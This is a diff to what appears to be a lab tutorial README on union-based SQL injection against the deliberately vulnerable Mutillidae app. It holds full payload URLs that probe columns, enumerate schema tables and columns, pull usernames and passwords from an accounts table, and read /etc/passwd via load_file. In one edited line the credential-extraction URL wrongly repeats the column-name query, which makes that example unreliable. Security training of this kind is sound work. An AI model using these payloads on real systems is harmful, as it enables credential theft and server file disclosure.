@@ -97,9 +97,12 @@ After logging out, Now choose the menu as shown below:
 
 ![image](https://github.com/user-attachments/assets/aec92214-08bd-490f-8f9b-a3a0f8fc2aa9)
 
+![image](https://github.com/user-attachments/assets/a0ea5de6-9733-4314-b97b-23368cca7fb1)
+
 
 From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
 
+![image](https://github.com/user-attachments/assets/9644277f-e82c-4a8d-aeab-d50f03274d0a)
 
 
 
@@ -111,8 +114,9 @@ Since we do not know the number of columns, we start at 1. To find the exact amo
 
 The browser url of this info page need to be modified with the url as below:
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
+(http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27order%20by%206%23&password=mutillidae123&user-info-php-submit-button=View+Account+Details)
 
+![image](https://github.com/user-attachments/assets/e04b1f0a-4aa6-4631-a079-1487bf60444e)
 
 
 
@@ -120,30 +124,39 @@ http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%2
 After adding the order by 6 into the existing url , the following error statement will be obtained:
 
 
+![image](https://github.com/user-attachments/assets/3cf39cdd-3f9d-468e-a75b-5b8e6b06752c)
 
 
 
 When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
 
 
+![image](https://github.com/user-attachments/assets/bd330c54-bfdd-4809-94c3-9bd4076f2617)
+
 
 
 As it is having 5 columns the query worked fine and it provides the correct result
 
+![image](https://github.com/user-attachments/assets/7edb3ba2-55ab-441d-a772-4b776f55f47e)
+
+
 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
 
+![image](https://github.com/user-attachments/assets/4dc18748-159e-4c1b-99e9-fbdd73f94617)
 
 
 
 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
 
+![image](https://github.com/user-attachments/assets/ea3e650e-c7c5-4341-ad7a-57b2af28e14d)
 
 
 
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
 
+![image](https://github.com/user-attachments/assets/750fe512-e6ce-4ede-ba81-0fe9ce6bab3f)
 
 
 
@@ -154,11 +167,12 @@ The url when executed, we obtain the necessary information about the database na
 
 Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
+(http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details)
 
 
 
 
+![image](https://github.com/user-attachments/assets/9994a016-8060-49c4-9c29-d8f799b33315)
 
 
 
@@ -179,6 +193,7 @@ Here we are trying to extract column names from the “accounts” table.
 
 
 
+![image](https://github.com/user-attachments/assets/23b3ca4b-8254-48b0-8cfb-7170174b6bf0)
 
 
 
@@ -190,10 +205,11 @@ Here we are trying to extract column names from the “accounts” table.
 
 The column names of the accounts is displayed below for the following url:
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
 
 
 
+![image](https://github.com/user-attachments/assets/b23227a4-8f5d-4fe8-b2f4-e12e713ec168)
 
 
 
@@ -205,10 +221,10 @@ Once we discovered all available column names, we can extract information from t
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
 
 
-
+![image](https://github.com/user-attachments/assets/47b71497-117b-4bf1-b899-d0254e1d3ef9)
 
 
 
@@ -221,10 +237,10 @@ We can use the “LOAD_FILE()” operator to peruse the contents of any file con
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 
 
-
+![image](https://github.com/user-attachments/assets/2c5dbe79-9041-42de-9e85-e2e011d0fa14)
 
 
 
